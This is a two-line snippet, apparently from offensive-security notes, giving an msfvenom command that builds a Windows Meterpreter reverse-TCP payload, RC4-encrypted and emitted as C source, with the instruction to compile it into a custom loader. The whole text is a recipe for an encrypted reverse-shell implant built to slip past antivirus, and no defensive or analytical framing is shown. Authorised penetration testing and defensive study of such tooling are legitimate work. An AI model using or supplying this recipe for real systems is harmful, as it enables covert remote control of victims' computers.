    msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 --encrypt rc4 --encrypt-key thisisakey -f c > /path/to/output.c

then compile to own loader
